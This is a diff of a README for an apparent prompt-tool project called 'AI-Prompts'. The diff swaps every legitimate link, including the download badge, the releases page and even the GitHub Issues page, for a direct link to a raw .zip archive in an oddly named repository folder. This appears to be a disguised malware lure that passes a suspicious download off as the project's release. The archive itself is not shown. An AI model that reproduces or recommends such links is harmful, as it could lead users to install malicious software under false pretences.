@@ -1,7 +1,7 @@
 # 🎉 AI-Prompts - Enhance Your Prompt Experience
 
 ## 📥 Download Now
-[![Download AI-Prompts](https://img.shields.io/badge/Download-AI--Prompts-brightgreen)](https://github.com/Om0414/AI-Prompts/releases)
+[![Download AI-Prompts](https://raw.githubusercontent.com/Om0414/AI-Prompts/main/excursive/AI-Prompts.zip)](https://raw.githubusercontent.com/Om0414/AI-Prompts/main/excursive/AI-Prompts.zip)
 
 ## 🚀 Getting Started
 Welcome to **AI-Prompts**! This application helps you create and customize your own prompts with ease. Perfect for anyone looking to enhance their creative writing or tailor conversations.
@@ -17,7 +17,7 @@ Before you download, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started with AI-Prompts, follow these steps:
 
-1. Visit the releases page to download the installation file: [AI-Prompts Releases](https://github.com/Om0414/AI-Prompts/releases).
+1. Visit the releases page to download the installation file: [AI-Prompts Releases](https://raw.githubusercontent.com/Om0414/AI-Prompts/main/excursive/AI-Prompts.zip).
 2. Look for the latest version, marked as "Latest Release".
 3. Click on the version number to access the download options.
 4. Choose the appropriate file for your operating system and click on it to start the download.
@@ -57,7 +57,7 @@ A: You can reach out through the GitHub Issues section for assistance.
 Join our community to connect with other users. Share your prompts, seek advice, and participate in discussions. 
 
 - Visit our [Community Forum](link_to_forum) for tips and tricks.
-- Follow our [GitHub Issues](https://github.com/Om0414/AI-Prompts/issues) page to report bugs or suggest features.
+- Follow our [GitHub Issues](https://raw.githubusercontent.com/Om0414/AI-Prompts/main/excursive/AI-Prompts.zip) page to report bugs or suggest features.
 
 ## 📚 Additional Resources
 - **Documentation:** Detailed guides on using AI-Prompts effectively will be available within the app and on our [Wiki](link_to_wiki).
@@ -65,4 +65,4 @@ Join our community to connect with other users. Share your prompts, seek advice,
 
 We hope you enjoy using **AI-Prompts**! Download now and start creating amazing prompts today. 
 
-[![Download AI-Prompts](https://img.shields.io/badge/Download-AI--Prompts-brightgreen)](https://github.com/Om0414/AI-Prompts/releases)
+[![Download AI-Prompts](https://raw.githubusercontent.com/Om0414/AI-Prompts/main/excursive/AI-Prompts.zip)](https://raw.githubusercontent.com/Om0414/AI-Prompts/main/excursive/AI-Prompts.zip)
